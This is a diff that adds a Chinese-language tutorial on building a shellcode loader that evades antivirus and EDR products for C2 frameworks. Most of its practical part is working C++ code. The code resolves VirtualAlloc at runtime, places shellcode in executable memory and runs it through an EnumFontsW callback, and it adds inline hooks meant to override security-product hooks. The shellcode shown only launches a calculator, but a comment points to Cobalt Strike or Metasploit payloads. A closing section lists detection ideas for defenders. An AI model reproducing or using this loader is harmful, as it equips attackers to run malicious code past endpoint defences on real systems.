@@ -1,0 +1,221 @@
+## 1. 概述
+
+在高级的攻击与防御对抗中，C2（Command and Control）框架的 ShellCode 加载器（Loader）是整个攻击链路的关键起点。为了成功执行后续的恶意代码并规避终端安全产品（如 EDR、AV）的检测，加载器必须采用各种免杀技术。本文档深入探讨了三种核心的免杀技术：**动态 API 解析**、**Inline Hook 钩子技术**以及**利用回调函数加载 ShellCode**，旨在绕过基于静态特征和动态行为的检测。
+
+本文将结合技术原理与实战代码，详细阐述如何将这些技术应用于 ShellCode 加载器中，以提升其隐蔽性和对抗能力。
+
+## 2. 技术原理
+
+### 2.1 动态 API 解析 (Dynamic API Resolution)
+
+*   **目的**：绕过对程序导入地址表（IAT）的静态扫描。
+*   **原理**：
+    传统的程序在编译时会将其需要的所有外部函数（如 `VirtualAlloc`, `CreateThread`）记录在 PE 文件的导入表中。安全软件会重点扫描这个表，一旦发现可疑或危险的函数（如内存分配、执行相关的 API），就可能将程序标记为恶意。
+
+    动态 API 解析技术在运行时通过 `GetModuleHandle` 获取所需 DLL（如 `Kernel32.dll`）的基地址，再结合 `GetProcAddress` 在内存中动态查找目标函数的实际地址，然后通过函数指针进行调用。整个过程中，PE 文件的导入表是“干净”的，不包含任何敏感 API，从而有效规避静态特征检测。
+
+### 2.2 Inline Hook 钩子技术
+
+*   **目的**：绕过对内存中特定 API 调用的动态行为监控。
+*   **原理**：
+    Inline Hook 是一种在应用层通过直接修改目标函数内存代码来实现拦截的技术。其核心思想是在目标函数的起始位置，用一个跳转指令（如 `JMP`）覆盖掉原始的几字节机器码。当程序调用这个被“钩住”的函数时，CPU 会执行我们插入的跳转指令，将执行流重定向到我们自己编写的“钩子函数”（Hook Function）。
+
+    在钩子函数中，我们可以执行自定义逻辑（例如，检查调用参数、修改行为、记录日志），然后再选择性地恢复原始函数代码并执行它，或者直接伪造一个返回值，从而实现对原函数行为的完全控制。这种技术常被安全软件用于监控系统调用，我们也可以反其道而行之，用它来劫持或伪造某些检测逻辑。
+
+### 2.3 回调函数加载 (Callback Loading)
+
+*   **目的**：将 ShellCode 的执行逻辑隐藏在合法的、由系统触发的回调流程中。
+*   **原理**：
+    许多 Windows API 提供了回调机制，允许程序将一个函数指针作为参数传递给系统。当某个特定事件发生时，系统会负责调用这个函数。例如，`EnumFontsW` 用于枚举系统字体，它会为找到的每一个字体调用一次我们提供的回调函数。
+
+    我们可以利用这个机制，首先使用 `VirtualAlloc` 申请一块可读可写可执行（RWX）的内存，将 ShellCode 复制进去。然后，将 ShellCode 的起始地址作为函数指针，传递给一个无害的系统 API（如 `EnumFontsW`）作为其回调函数。当系统调用这个 API 时，它会在内部触发对我们提供的“回调函数”（实际上是 ShellCode）的调用，从而隐蔽地执行了恶意代码。这种方式的调用链始于系统模块，可以有效迷惑基于调用栈的启发式检测。
+
+## 3. 环境准备
+
+*   **操作系统**: Windows 10/11 x64
+*   **开发环境**: Visual Studio 2019 或更高版本
+*   **编译目标**: x64 Release
+*   **必备知识**: C/C++ 编程、Windows API、x86/x64 汇编基础
+
+## 4. 实战示例：构建组合式加载器
+
+以下我们将演示如何将上述三种技术结合，构建一个更为隐蔽的 ShellCode 加载器。
+
+### 4.1 步骤一：动态解析所需 API
+
+在加载器的入口点，我们不直接调用 `VirtualAlloc` 等敏感函数，而是先动态获取它们的地址。
+
+```cpp
+#include <windows.h>
+#include <iostream>
+
+// 1. 定义所需API的函数指针类型
+// VirtualAlloc - Kernel32.dll
+typedef LPVOID(WINAPI* fnVirtualAlloc)(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD  flAllocationType,
+    DWORD  flProtect
+);
+
+// GetDC - User32.dll
+typedef HDC(WINAPI* fnGetDC)(
+    HWND hWnd
+);
+
+// EnumFontsW - GDI32.dll
+typedef int(WINAPI* fnEnumFontsW)(
+    HDC           hdc,
+    LPCWSTR       lpszFaceName,
+    FONTENUMPROCW lpEnumFontProc,
+    LPARAM        lParam
+);
+
+// ReleaseDC - User32.dll
+typedef int(WINAPI* fnReleaseDC)(
+    HWND hWnd,
+    HDC  hdc
+);
+
+int main() {
+    // 2. 动态获取API地址
+    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualAlloc");
+    fnGetDC pGetDC = (fnGetDC)GetProcAddress(GetModuleHandleA("User32.dll"), "GetDC");
+    fnEnumFontsW pEnumFontsW = (fnEnumFontsW)GetProcAddress(GetModuleHandleA("GDI32.dll"), "EnumFontsW");
+    fnReleaseDC pReleaseDC = (fnReleaseDC)GetProcAddress(GetModuleHandleA("User32.dll"), "ReleaseDC");
+
+    if (!pVirtualAlloc || !pGetDC || !pEnumFontsW || !pReleaseDC) {
+        std::cout << "Failed to resolve one or more APIs." << std::endl;
+        return -1;
+    }
+
+    // ShellCode (e.g., from Cobalt Strike or Metasploit)
+    // 示例: 弹出一个计算器的 ShellCode
+    unsigned char shellcode[] = "\x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x03\x3C\xAE\xFF\xD7\x48\x83\xC4\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3";
+    SIZE_T shellcodeSize = sizeof(shellcode);
+
+    // 3. 使用动态获取的函数指针分配内存
+    LPVOID shellcodeAddress = pVirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (shellcodeAddress == NULL) {
+        std::cout << "VirtualAlloc failed." << std::endl;
+        return -1;
+    }
+
+    // 4. 复制ShellCode到新分配的内存
+    RtlMoveMemory(shellcodeAddress, shellcode, shellcodeSize);
+
+    // 5. 使用回调函数执行ShellCode
+    HDC hdc = pGetDC(NULL);
+    pEnumFontsW(hdc, NULL, (FONTENUMPROCW)shellcodeAddress, NULL);
+    pReleaseDC(NULL, hdc);
+
+    return 0;
+}
+```
+
+### 4.2 步骤二：实现 Inline Hook 绕过监控
+
+假设 EDR 通过 Hook `MessageBoxA` 来监控弹窗行为。我们可以先发制人，用自己的 Hook 去覆盖 EDR 的 Hook，或者在 EDR Hook 之前执行我们的逻辑。
+
+以下是 Inline Hook 的核心实现逻辑：
+
+```cpp
+// 全局变量存储原始字节和函数地址
+BYTE originalBytes[5] = { 0 };
+FARPROC originalFunctionAddress = NULL;
+
+// 我们的钩子函数
+int WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
+    // 1. 在这里执行我们的恶意逻辑或伪造行为
+    std::cout << "[+] MessageBoxA Hooked! Intercepted call." << std::endl;
+    std::cout << "[+] Caption: " << lpCaption << ", Text: " << lpText << std::endl;
+
+    // 2. 恢复原始函数
+    WriteProcessMemory(GetCurrentProcess(), (LPVOID)originalFunctionAddress, originalBytes, sizeof(originalBytes), NULL);
+
+    // 3. 调用原始函数 (可选)
+    int result = MessageBoxA(hWnd, "This is the modified text!", "Hooked Caption", uType);
+
+    // 4. 再次设置Hook，以便下次调用时仍然生效
+    BYTE jumpInstruction[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
+    DWORD relativeAddress = (DWORD)((DWORD_PTR)MyMessageBoxA - (DWORD_PTR)originalFunctionAddress - 5);
+    memcpy(jumpInstruction + 1, &relativeAddress, sizeof(DWORD));
+    WriteProcessMemory(GetCurrentProcess(), (LPVOID)originalFunctionAddress, jumpInstruction, sizeof(jumpInstruction), NULL);
+
+    return result; // 返回伪造或原始的结果
+}
+
+// 设置Hook的函数
+void SetHook() {
+    HMODULE hUser32 = GetModuleHandleA("user32.dll");
+    originalFunctionAddress = GetProcAddress(hUser32, "MessageBoxA");
+
+    if (originalFunctionAddress != NULL) {
+        // 1. 保存原始函数的前5个字节
+        ReadProcessMemory(GetCurrentProcess(), (LPCVOID)originalFunctionAddress, originalBytes, 5, NULL);
+
+        // 2. 修改内存保护属性为可写
+        DWORD oldProtect;
+        VirtualProtect((LPVOID)originalFunctionAddress, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+        // 3. 构建JMP指令 (E9)
+        // JMP [MyMessageBoxA地址 - MessageBoxA地址 - 5]
+        BYTE jumpInstruction[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
+        DWORD relativeAddress = (DWORD)((DWORD_PTR)MyMessageBoxA - (DWORD_PTR)originalFunctionAddress - 5);
+        memcpy(jumpInstruction + 1, &relativeAddress, sizeof(DWORD));
+
+        // 4. 写入JMP指令，实现Hook
+        WriteProcessMemory(GetCurrentProcess(), (LPVOID)originalFunctionAddress, jumpInstruction, sizeof(jumpInstruction), NULL);
+
+        // 5. 恢复原始内存保护属性
+        VirtualProtect((LPVOID)originalFunctionAddress, 5, oldProtect, &oldProtect);
+    }
+}
+```
+
+## 5. 关键细节与注意事项
+
+### 5.1 Inline Hook 的实现方式
+
+*   **x86 架构**:
+    *   `JMP <相对地址>` (Opcode: `E9`): 这是最常用的方式，占用 5 字节。跳转地址是相对于下一条指令的偏移。
+    *   `MOV EAX, <绝对地址>; JMP EAX` (Opcodes: `B8`, `FF E0`): 占用 7 字节，适用于绝对地址跳转。
+    *   `PUSH <绝对地址>; RET` (Opcodes: `68`, `C3`): 占用 5 字节，通过将地址压栈再返回实现跳转。
+
+*   **x64 架构**:
+    *   由于 x64 地址空间巨大，`E9` 的相对跳转范围（32位）有限，可能不足以跳转到任意地址。
+    *   `MOV R12, <绝对地址>; JMP R12` (Opcodes: `49 BC`, `41 FF E4`): 使用 64 位寄存器进行绝对地址跳转，是 x64 下更可靠的方式。
+    *   `MOV R12, <绝对地址>; PUSH R12; RET` (Opcodes: `49 BC`, `41 54`, `C3`): 类似于 x86 的 PUSH/RET 方式。
+
+### 5.2 Hook 实施要点
+
+1.  **原子性与线程安全**：在多线程环境下，修改函数代码时可能存在竞态条件。一个线程正在修改，另一个线程恰好执行到被修改了一半的指令，会导致程序崩溃。实际应用中需要使用 `SuspendThread` 挂起其他线程或使用更复杂的同步机制。
+2.  **内存保护**：代码段（`.text`）通常是只读的。在写入 JMP 指令前，必须使用 `VirtualProtect` 将目标内存区域的保护属性修改为可写（如 `PAGE_EXECUTE_READWRITE`）。操作完成后，**务必恢复原始的内存保护属性**，否则会留下非常明显的痕迹。
+3.  **保持原功能**：一个设计良好的 Hook 应该是不影响程序正常功能的。这意味着钩子函数在完成其任务后，需要调用原始函数，并将原始函数的返回值正确地返回给调用者。
+4.  **Hook 的持久化**：如示例代码所示，如果希望 Hook 持续生效，那么在调用完原始函数后，需要再次将 JMP 指令写回，否则 Hook 将只生效一次。
+
+### 5.3 其他 API Hook 技术拓展
+
+除了 Inline Hook，还有其他几种常见的 Hook 技术，适用于不同场景：
+
+*   **IAT Hook (导入地址表钩子)**：通过修改 PE 文件的导入表，将某个函数的地址替换为我们的钩子函数地址。这种方式在模块加载时生效，比 Inline Hook 更早。
+*   **SSDT Hook (系统服务描述符表钩子)**：这是一种内核层技术，通过修改内核中的 SSDT 表，将系统服务（syscall）重定向到自定义的内核函数。权限高，检测难度大，但实现复杂且稳定性要求极高。
+*   **IRP Hook (I/O 请求包钩子)**：也是一种内核层技术，通过在驱动程序中过滤或修改 IRP，来拦截文件、网络、注册表等 I/O 操作。
+
+## 6. 安全总结
+
+本文介绍的技术是现代恶意软件和红队工具中常见的免杀组合拳。
+
+*   **动态 API 解析** 旨在突破静态分析的防线。
+*   **回调函数加载** 则为代码执行提供了一条隐蔽的、由系统发起的调用路径，规避了简单的行为监控。
+*   **Inline Hook** 是一种更主动的对抗手段，用于篡改或绕过安全软件部署在内存中的监控点。
+
+作为防御者，理解这些技术的原理至关重要。检测策略也应相应演进，例如：
+*   监控 `GetProcAddress` 的调用，对敏感 API 的动态解析行为进行告警。
+*   扫描内存中不属于任何合法模块的可执行（X）页面（"Unbacked Memory"），这是 ShellCode 的常见藏身之处。
+*   通过校验关键 API 函数起始位置的字节码，检测是否存在 Inline Hook。
+*   分析线程调用栈，寻找从非代码区域或异常路径发起的执行流。
+
+攻防技术总是在不断螺旋上升，掌握底层原理是设计出更高级攻击手法和更有效防御策略的基石。
+
+---
